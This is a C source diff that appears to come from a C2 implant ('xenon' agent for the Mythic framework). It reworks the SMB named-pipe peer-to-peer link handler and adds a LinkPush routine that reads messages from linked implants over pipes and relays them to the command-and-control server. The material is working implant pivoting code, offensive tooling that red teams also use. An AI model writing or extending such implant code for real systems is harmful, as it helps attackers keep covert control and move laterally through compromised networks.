@@ -63,32 +63,31 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     SIZE_T P2pMsgLen        = 0;
     UINT32 NumOfDelegates   = 0;
 
-    /* Now check delegate boolean */
+    /* Response should contain a delegate msg for P2P checkin */
     BOOL isDelegates = (BOOL)ParserGetByte(&Response);
     _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
-    if ( isDelegates ) 
+    if ( isDelegates )
     {
-        NumOfDelegates = ParserGetInt32(&Response);
-        _dbg("Package should contain %d msgs.", NumOfDelegates);
+        NumOfDelegates  = ParserGetInt32(&Response);
+        P2pUuid         = ParserStringCopy(&Response, &P2pIdLen);
+        P2pMsg          = ParserStringCopy(&Response, &P2pMsgLen);
 
-        P2pUuid       = ParserGetString(&Response, &P2pIdLen);
-        P2pMsg        = ParserStringCopy(&Response, &P2pMsgLen);
+        _dbg("Package should contain : %d msgs.", NumOfDelegates);
+        _dbg("P2P New UUID           : %s", P2pUuid);
+        _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
 
-        _dbg("P2P New UUID          : %s", P2pUuid);
-        _dbg("P2P Raw Msg %d bytes  : %s", P2pMsgLen, P2pMsg);
+        // Update payload ID
+        xenonConfig->SmbLinks->AgentId = P2pUuid;
+
+        /* Forward Checkin Response to intended Linked Agent */
+        LinkForward( P2pMsg, P2pMsgLen );
     }
-    else 
+    else
     {
         _err("No delegates because byte was : 0x%hx", isDelegates);
         goto END;
     }
 
-    // Forward to pipe
-    LinkForward( P2pMsg, P2pMsgLen );
-
-
-    // _dbg("LINK_ADD Response");
-    //print_bytes(Response.Buffer, Response.Length);
 
     /* This agent may now receive delegate messages for Link */
 
@@ -258,7 +257,7 @@ BOOL LinkForward( PVOID Msg, SIZE_T Length )
     //     }
     // }
     BOOL    Success          = FALSE;
-    PLINKS  TempLink        = xenonConfig->SmbLinks;
+    PLINKS  TempLink         = xenonConfig->SmbLinks;
 
     if ( !PackageSendPipe(TempLink->hPipe, Msg, Length) ) {
         DWORD error = GetLastError();
@@ -299,6 +298,160 @@ UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
     // return ParserGetInt32(&Parser);
 
 }
+
+/**
+ * @brief Checks all Links for updates then pushes them to server
+ * 
+ * Note - this method does cause several network requests
+ */
+VOID LinkPush()
+{
+    PPackage    Package   = NULL;
+    PLINKS      TempList  = xenonConfig->SmbLinks;
+    DWORD       BytesSize = 0;
+    DWORD       Length    = 0;
+    PVOID       Output    = NULL;
+    ULONG32     NumLoops  = 0;
+
+    /*
+     * For each pivot, we loop up to MAX_SMB_PACKETS_PER_LOOP times
+     * this is to avoid potentially blocking the parent agent
+     */
+
+    _dbg("Pushing all Link messages to server! ");
+
+    do
+    {
+        if ( ! TempList )
+            break;
+
+        if ( TempList->hPipe )
+        {
+            NumLoops = 0;
+            do {
+
+                if ( PeekNamedPipe( TempList->hPipe, NULL, 0, NULL, &BytesSize, NULL ) )
+                {
+                    if ( BytesSize >= sizeof( UINT32 ) )
+                    {
+                        _dbg("Link ID [%x] has message of %d bytes", TempList->LinkId, BytesSize);
+                        
+                        Length = BytesSize;
+                        Output = LocalAlloc( LPTR, Length );
+                        memset(Output, 0, BytesSize);
+
+                        if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
+                        {
+                            /*
+                                TODO - fix this delegate message isn't being recognized by Mythic
+                            */
+                            _dbg("Linked Agent -> C2");
+                            print_bytes(Output, BytesSize);
+                            /* Send Link msg as a delegate type (LINK_MSG) */
+                            Package = PackageInit( LINK_MSG, TRUE );
+                            PackageAddString( Package, TempList->AgentId, FALSE );
+                            PackageAddBytes( Package, Output, BytesSize, TRUE );
+
+                            PackageSend( Package, NULL );
+
+                            /* Clean up */
+                            LocalFree(Output);
+                            Output = NULL;
+                            Length = 0;
+                        }
+                        else
+                        {
+                            _err( "ReadFile: Failed[%d]\n", GetLastError() );
+                            LocalFree(Output);
+                            Output = NULL;
+                            Length = 0;
+                            break;
+                        }
+
+
+                        // if ( PeekNamedPipe( TempList->hPipe, &Length, BytesSize, NULL, &BytesSize, NULL ) )
+                        // {
+                        //     Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
+                        //     Output = LocalAlloc( LPTR, Length );
+
+                        //     if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
+                        //     {
+                        //         _dbg("Linked Agent -> C2: %s", Output)
+                        //         /* Send Link msg as a delegate type (LINK_MSG) */
+                        //         Package = PackageInit( LINK_MSG, TRUE );
+                        //         PackageAddString( Package, TempList->AgentId, FALSE );
+                        //         PackageAddBytes( Package, Output, BytesSize, TRUE );
+
+                        //         PackageSend( Package, NULL );
+
+                        //         /* Clean up */
+                        //         LocalFree(Output);
+                        //         Output = NULL;
+                        //         Length = 0;
+                        //     }
+                        //     else
+                        //     {
+                        //         _err( "ReadFile: Failed[%d]\n", GetLastError() );
+                        //         LocalFree(Output);
+                        //         Output = NULL;
+                        //         Length = 0;
+                        //         break;
+                        //     }
+                        // }
+                        // else
+                        // {
+                        //     _err( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
+                        //     break;
+                        // }
+                    }
+                    else 
+                    {
+                        _dbg("Link ID [%x] message less than 4 bytes", TempList->LinkId);
+                        break;
+                    }
+                }
+                else
+                {
+                    _err( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
+
+                    if ( GetLastError() == ERROR_BROKEN_PIPE )
+                    {
+                        _err( "ERROR_BROKEN_PIPE. Remove pivot" );
+
+                        // DWORD DemonID = TempList->DemonID;
+                        // TempList      = TempList->Next;
+                        
+                        // BOOL  Removed = LinkRemove( DemonID );
+
+                        // _dbg( "Link removed: %s\n", Removed ? "TRUE" : "FALSE" )
+
+                        /* Report if we managed to remove the selected pivot */
+                        // Package = PackageCreate( DEMON_COMMAND_PIVOT );
+                        // PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
+                        // PackageAddInt32( Package, Removed );
+                        // PackageAddInt32( Package, DemonID );
+                        // PackageTransmit( Package );
+
+                        break;
+                    }
+
+                    
+                    break;
+                }
+
+                NumLoops++;
+            } while ( NumLoops < MAX_SMB_PACKETS_PER_LOOP );
+        }
+
+        // select the next pivot
+        if ( TempList )
+            TempList = TempList->Next;
+
+    } while ( TRUE );
+}
+
+
+
 
 
 
